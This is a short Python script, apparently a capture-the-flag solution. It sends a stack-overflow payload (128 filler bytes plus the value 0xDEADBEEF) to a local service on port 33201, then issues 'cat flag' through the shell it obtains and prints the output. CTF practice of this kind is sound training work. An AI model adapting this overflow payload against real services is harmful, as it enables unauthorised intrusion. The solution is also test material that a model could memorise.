#!/usr/bin/env python3
import argparse
import socket


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=33201)
    args = parser.parse_args()

    payload = b"A" * 128
    payload += (0xDEADBEEF).to_bytes(4, "little")
    payload += b"\ncat flag\nexit\n"

    with socket.create_connection((args.host, args.port), timeout=8) as sock:
        sock.settimeout(2)
        sock.sendall(payload)
        output = bytearray()
        while True:
            try:
                chunk = sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            output.extend(chunk)

    print(output.decode("latin-1", errors="replace"))


if __name__ == "__main__":
    main()
